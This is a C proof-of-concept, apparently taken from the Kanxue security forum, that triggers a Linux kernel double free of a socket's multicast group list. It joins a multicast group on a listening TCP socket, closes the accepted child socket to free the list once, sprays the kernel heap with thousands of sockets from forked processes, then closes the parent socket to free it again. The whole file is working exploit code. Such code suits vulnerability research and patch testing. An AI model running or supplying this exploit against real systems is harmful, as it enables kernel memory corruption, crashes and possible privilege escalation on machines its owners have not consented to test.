
```c
#include <stdio.h>

#include <stdlib.h>

#include <sys/select.h>  

#include <sys/socket.h>  

#include <arpa/inet.h>  

#include <netdb.h> 

#include <string.h> 

#include <unistd.h> 

#include <netinet/in.h> 

#include <fcntl.h> 

#include <time.h> 

#include <sys/types.h>

#include <pthread.h>

#include <net/if.h>

#include <errno.h>

#include <assert.h>

#include <sys/uio.h>

#include <sys/resource.h>

#include <sys/wait.h>

#include <sys/sysinfo.h>

#define PORT1 2333
#define PORT2 4321
#define BUFF_SIZE 48
#define SPRAY_SIZE 10000
#define MAX_CHILDREN_PROCESS 1024
#define MAX_CHILDREN_SOCKETS 60000

struct child_status_t {
  int num_sockets;
  int result;
};

int heap_spray_sock[MAX_CHILDREN_SOCKETS];

int maximize_fd_limit(void){
	struct  rlimit rlim;
	int ret;

	ret = getrlimit(RLIMIT_NOFILE,&rlim);
	if(ret != 0){
		return -1;
	}

	rlim.rlim_cur = rlim.rlim_max;
	setrlimit(RLIMIT_NOFILE,&rlim);

	ret = getrlimit(RLIMIT_NOFILE,&rlim);
	if(ret != 0){
		return -1;
	}
	return rlim.rlim_cur;
}

static int
create_socket(void)
{
	int sock;  
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	if (sock == -1) {
		return -1;
  	}
  	return sock;
}

static int do_child_task(int num_fds)
{
	int socks[num_fds];
	int heap_success_num;
	int ret;
	int i;
	struct group_req group = {0};   
  	struct sockaddr_in *psin;

	for(i=0; i < num_fds;i++){
		socks[i] = create_socket();
		if(socks[i] == -1){
			break;
		}
	}
	num_fds = i;
	fflush(stdout);
	printf("success create socket: %d\n",num_fds);
	
	for(i=0; i < num_fds; i++) {
		psin = (struct sockaddr_in *)&group.gr_group;
		psin->sin_family = AF_INET;
		psin->sin_port = htons(0);
		psin->sin_addr.s_addr = htonl(inet_addr("224.0.0.0"));

		if(setsockopt(socks[i], SOL_IP, MCAST_JOIN_GROUP, &group, sizeof (group)) != 0){
			perror("heap spray setsockopt().");
			break;
		}
		fflush(stdout);
		printf("888");
	}
	heap_success_num = i;
	fflush(stdout);
	printf("success heap spray setsockopt: %d\n",heap_success_num);
	
	for(i=0; i < num_fds; i++){
		ret = close(socks[i]);
	}

	if(ret == -1){
		return -1;
	}
	return heap_success_num;
}

int create_child(int num_fds,pid_t *pid, int *num_socks_created)
{
	int pipe_fds[2];
	int ret;
	
	*pid = -1;
	*num_socks_created = 0;

	*pid = fork();
	if(*pid == -1){
		perror("fork()");
		return -1;
	}
	if(*pid == 0){
		*num_socks_created = do_child_task(num_fds);
		exit(0);
	}
	
	return 0;
}

void create_heap_spray_sockets(void)
{
	static pid_t pids[MAX_CHILDREN_PROCESS];
	static int pipe_reads[MAX_CHILDREN_PROCESS];
	int max_fds;
	int num_socks;
	int num_children_process;
	int num_children_socks;
	int ret;
	int i;

	printf("creating heap spray sockets...\n");
	fflush(stdout);

	max_fds = maximize_fd_limit();
	printf("max_fds: %d\n",max_fds);

	num_children_process = 0;
	num_socks = 0;
	num_children_socks = 0;
	ret = 0;

	for(i = 0; i < MAX_CHILDREN_PROCESS;i++){
		int max_children_socks;
		int num_socks_created;

		max_children_socks = max_fds;
		if(max_children_socks + num_children_socks > MAX_CHILDREN_SOCKETS){
			max_children_socks = MAX_CHILDREN_SOCKETS - num_children_socks;
			if(max_children_socks < 1){
				break;
			}	
		}
		printf("create %d child process.\n",i+1);
		create_child(max_children_socks,&pids[i],&num_socks_created);
		printf("the %d child process, child pid: %d\n", i+1,pids[i]);
		
		if(pids[i] == -1){
			break;
		}

		num_children_process++;
		num_children_socks += num_socks_created;

		printf(".");
		fflush(stdout);

	}
	printf(" OK\n");
	printf("%d sockets created\n",num_children_socks);

	for(i=0; i<num_children_process;i++){
		kill(pids[i],SIGKILL);
	}
}

void* free_fn(void* arg)
{
	int sockfd_client;
	int error;
	struct sockaddr_in sockaddr_client;
	struct sockaddr_in sockaddr_server;
	
	memset(&sockaddr_client,0,sizeof(sockaddr_client));
	sockaddr_client.sin_family = AF_INET;
	sockaddr_client.sin_port = htons(0);
	sockaddr_client.sin_addr.s_addr = htons(INADDR_ANY);

	if((sockfd_client = socket(AF_INET,SOCK_STREAM|SOCK_CLOEXEC,IPPROTO_IP)) == -1){
		printf("thread: socket error\n");
		pthread_exit(0);
	}
    if(bind(sockfd_client,(struct sockaddr*)&sockaddr_client,sizeof(sockaddr_client))){
		printf("[Client] client bind port failed!\n");
		exit(1);
	}
	
	memset(&sockaddr_server,0,sizeof(sockaddr_server));
	sockaddr_server.sin_family = AF_INET;
	sockaddr_server.sin_port = htons(PORT1);
	sockaddr_server.sin_addr.s_addr = htons(INADDR_ANY);

	if((error = connect(sockfd_client,(struct sockaddr*)&sockaddr_server,sizeof(sockaddr_server))) ==0){
		printf("thread: client connected successfully.\n");
	}else{
		perror("error:");
		printf("thread: connect error.\n");
	}
    close(sockfd_client);    
	pthread_exit(0);
}

int main(int argc, char** argv)
{
    int socket_fd;
	int retn;
	struct sockaddr_in servaddr;
	struct sockaddr_in clientaddr;
	struct group_req group = {0};
    struct sockaddr_in *psin;

	printf("pid : %d\n",getpid());
	
	psin = (struct sockaddr_in *)&group.gr_group;
    psin->sin_family = AF_INET;
    psin->sin_addr.s_addr = htonl(inet_addr("10.10.2.224"));
	
	if( (socket_fd = socket(AF_INET,SOCK_STREAM,IPPROTO_IP)) ==-1){
		printf("socket error\n");
		exit(0);
	}
        
 	memset(&servaddr,0,sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htons(INADDR_ANY);
	servaddr.sin_port = htons(PORT1);

    if(setsockopt(socket_fd, SOL_IP, MCAST_JOIN_GROUP, &group, sizeof (group))==-1){
		printf("setsockopt error\n");
		perror("error: ");
		exit(0);
	}
	
	if(bind(socket_fd,(struct sockaddr*)&servaddr,sizeof(servaddr))==0){
		printf("bind successfuly.\n");
	}else{
		printf("bind error.\n");
		exit(0);
	}

	if(listen(socket_fd,2)==0){
		printf("listen successfuly.\n");
	}else{
		printf("listen error.\n");
		exit(0);
	}

	pthread_t free;
	if(pthread_create(&free,NULL,free_fn,NULL)){
		printf("pthread_create error\n");
		exit(0);
	}
	sleep(3);

	int size = sizeof(clientaddr);   
    retn = accept(socket_fd,(struct sockaddr*)&clientaddr,(socklen_t *)&size);	
	if(retn < 0){
		perror("accept error.\n");
	}  

	printf("start to sleep.\n");
	sleep(3);
	printf("stop to sleep.\n");
	
	printf("start to free mc_list firstly\n");
	close(retn);
    printf("free firstly ok!\n");

    printf("start to heap spray!\n");
    create_heap_spray_sockets();
	printf("heap spray ok! start to target vuln\n");
    	 
    printf("start to free mc_list secondly!\n");
	sleep(5);
	close(socket_fd);
	
	return 0;
}
```

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
